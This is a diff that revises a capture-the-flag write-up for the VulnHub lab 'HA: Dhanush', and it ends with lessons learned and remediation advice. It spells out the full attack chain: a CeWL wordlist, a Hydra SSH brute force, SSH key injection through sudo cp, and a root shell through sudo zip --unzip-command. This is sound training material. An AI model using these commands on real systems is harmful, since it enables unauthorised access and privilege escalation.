@@ -1,139 +1,154 @@
 # HA: Dhanush — Writeup
 
-| | |
-|-|-|
-| **Target IP** | 192.168.1.101 (host-only) |
-| **Difficulty** | Intermediate |
+| Field | Value |
+|---|---|
+| **Target IP** | 192.168.1.101 |
+| **Difficulty** | Easy |
 | **OS** | Linux |
-| **Root Flag** | /root/flag.txt |
-| **Source** | [VulnHub](https://www.vulnhub.com/entry/ha-dhanush,411/) |
+| **Goal** | Read /root/flag.txt |
+| **Source** | [HackingArticles](https://www.hackingarticles.in/ha-dhanush-vulnhub-walkthrough/) |
 
 ## Attack Summary
 
-nmap (SSH on 65345) → CeWL wordlist → Hydra SSH brute (pinak:Gandiv) → sudo cp to inject authorized_keys → SSH lateral move to sarang → sudo zip unzip-command abuse → root
+CeWL-generated wordlist brute-forced SSH credentials on a non-standard port, sudo `cp` allowed placing an SSH key into a second user's `authorized_keys`, and sudo `zip` with `--unzip-command` yielded a root shell.
 
 ## Methodology
 
-1. Network discovery — find non-standard SSH port
-2. Build wordlist from web app with CeWL
-3. Hydra brute-force SSH
-4. Lateral move to sarang via sudo cp of SSH authorized_keys
-5. Escalate via sudo zip abuse
+1. Recon — nmap full-port scan; find SSH on port 65345 and HTTP on port 80
+2. Enumeration — CeWL wordlist from the web application
+3. Exploitation — Hydra SSH brute-force recovers `pinak:Gandiv`
+4. Privilege Escalation — sudo `cp` for lateral move to `sarang`, then sudo `zip` for root
 
----
-
-## Step 1: Network Discovery
+## Step 1: Reconnaissance
 
 ```bash
-sudo netdiscover -i eth1 -r 192.168.1.0/24
-nmap -p- -A 192.168.1.101
+nmap -sV -sC -p- 192.168.1.101
 ```
 
-Open ports: **80** (HTTP), **65345** (SSH — non-standard port).
+Key open ports:
 
-![Nmap full port scan](images/01-nmap.png)
+| Port | Service |
+|---|---|
+| 80/tcp | HTTP |
+| 65345/tcp | SSH (OpenSSH on non-standard port) |
 
----
+The web application source and images reveal no obvious entry points. The non-standard SSH port is a key observation.
 
-## Step 2: Build Wordlist and Brute SSH
+![Nmap full-port scan](images/01-nmap.png)
 
-Generate a wordlist from the target web app:
+## Step 2: Enumeration — CeWL Wordlist
+
+Generate a custom wordlist from the site content:
 
 ```bash
 cewl http://192.168.1.101/ -w dict.txt
-cat dict.txt
+cat dict.txt | wc -l
 ```
 
-Use it with Hydra against the non-standard SSH port:
+This produces a targeted wordlist of words extracted from the application, useful for both username and password attempts.
+
+![CeWL wordlist generation and site enumeration](images/02-enum.png)
+
+## Step 3: Exploitation — SSH Brute-Force
+
+Use Hydra against SSH on port 65345, trying the generated wordlist for both usernames and passwords:
 
 ```bash
-hydra -L user.txt -P dict.txt 192.168.1.101 ssh -s 65345 -e nsr
+hydra -L dict.txt -P dict.txt ssh://192.168.1.101 -s 65345 -t 4 -V
 ```
 
-Credentials found: **pinak:Gandiv**
+Recovered credentials: `pinak:Gandiv`.
 
-![CeWL and Hydra](images/02-cewl-hydra.png)
-
----
-
-## Step 3: SSH In and Enumerate
+Login via SSH:
 
 ```bash
 ssh pinak@192.168.1.101 -p 65345
+```
+
+Check sudo privileges:
+
+```bash
 sudo -l
+# User pinak may run the following commands:
+#   (sarang) NOPASSWD: /bin/cp
 ```
 
-The sudo list shows pinak can run `/bin/cp` as user `sarang`.
+`pinak` can run `cp` as user `sarang` without a password.
+
+![SSH brute-force and initial access](images/03-exploit.png)
+
+## Step 4: Lateral Movement — sudo cp to inject SSH key
+
+The `sarang` user's `.ssh` directory is not directly readable. Generate an SSH key pair:
 
 ```bash
-ls /home/sarang
+ssh-keygen -t rsa -f /tmp/mykey -N ""
+cat /tmp/mykey.pub
 ```
 
-![SSH access as pinak](images/03-ssh.png)
-
----
-
-## Step 4: Lateral Move to sarang via sudo cp
-
-Generate an SSH key pair on the attacker:
+Copy the public key to pinak's home directory, then use `sudo cp` to place it into sarang's `authorized_keys`:
 
 ```bash
-ssh-keygen -f /tmp/dhanush_key
+cp /tmp/mykey.pub /home/pinak/authorized_keys
+sudo -u sarang /bin/cp /home/pinak/authorized_keys /home/sarang/.ssh/authorized_keys
 ```
 
-Inject the public key into sarang's authorized_keys:
+Login as `sarang` using the private key:
 
 ```bash
-# As pinak on target:
-cp ~/.ssh/id_rsa.pub /home/pinak/id_rsa.pub
-chmod 644 /home/pinak/id_rsa.pub
-sudo -u sarang /bin/cp /home/pinak/id_rsa.pub /home/sarang/.ssh/authorized_keys
+ssh -i /tmp/mykey sarang@192.168.1.101 -p 65345
 ```
 
-Now SSH in as sarang:
+Check sudo privileges as sarang:
 
 ```bash
-ssh sarang@127.0.0.1 -i /tmp/dhanush_key -p 65345
 sudo -l
+# User sarang may run the following commands:
+#   (root) NOPASSWD: /usr/bin/zip
 ```
 
-sarang can run `zip` as root without a password.
+`sarang` can run `zip` as root without a password.
 
-![Lateral move to sarang](images/04-lateral-move.png)
+![Lateral movement via sudo cp key injection](images/04-privesc.png)
 
----
+## Step 5: Privilege Escalation — sudo zip shell escape
 
-## Step 5: sudo zip Abuse → Root
-
-The `zip --unzip-command` option executes an arbitrary command when testing with `-T`. Since sudo allows zip as root, this spawns a root shell:
+Use the `zip` GTFOBin technique with `--unzip-command` to spawn a root shell:
 
 ```bash
-touch /tmp/raj
-sudo zip /tmp/raj.zip /tmp/raj -T --unzip-command="sh -c /bin/bash"
+TF=$(mktemp -u)
+sudo zip $TF /etc/hosts -T --unzip-command="sh -c /bin/bash"
 ```
+
+Confirm root access:
 
 ```bash
 id
-# uid=0(root) gid=0(root)
-cd /root
-cat flag.txt
+# uid=0(root) gid=0(root) groups=0(root)
+
+cat /root/flag.txt
 ```
 
-![Root shell via zip](images/05-root.png)
+## Step 6: Root Flag
 
----
+```bash
+cat /root/flag.txt
+```
+
+![Root flag](images/05-root-flag.png)
 
 ## Lessons Learned
 
-1. **Non-standard port** scanning (`-p-`) is mandatory — services on unusual ports are commonly overlooked
-2. **CeWL + Hydra** is a reliable combo against SSH when the password follows web app vocabulary
-3. **sudo cp** with no restrictions allows injecting SSH keys for any user on the system
-4. **sudo zip with -T** is a well-known GTFOBins vector — any write or unzip-capable sudo command may escalate
+1. Non-standard SSH ports do not provide meaningful security if they are discoverable via a full-port nmap scan.
+2. CeWL-generated wordlists are highly effective when developers reuse words from their own applications as passwords.
+3. `sudo` rights to file-copy commands (`cp`) are as dangerous as write access to the target path: they allow injecting authorized SSH keys or overwriting `/etc/passwd`.
+4. `zip` in the GTFOBins list can execute arbitrary commands via `--unzip-command`, making any sudo grant to it equivalent to root.
 
 ## Remediation
 
-| Vulnerability | Fix |
-|---------------|-----|
-| SSH on non-standard port with weak password | Enforce key-only auth; disable password auth |
-| sudo /bin/cp for non-root user | Remove or restrict to specific source/destination paths |
-| sudo zip NOPASSWD | Remove from sudoers; never grant write-capable commands without strong need |
+| Vulnerability | Recommended Fix |
+|---|---|
+| Site-content-derived password | Enforce strong random passwords; ban dictionary and CeWL-guessable words |
+| SSH on non-standard port | Port security-by-obscurity is ineffective; use key-based auth and fail2ban instead |
+| sudo cp as another user | Remove or scope file-copy sudo rules; use dedicated provisioning tools |
+| sudo zip as root | Remove sudo grant for zip; review all GTFOBins entries in sudoers |
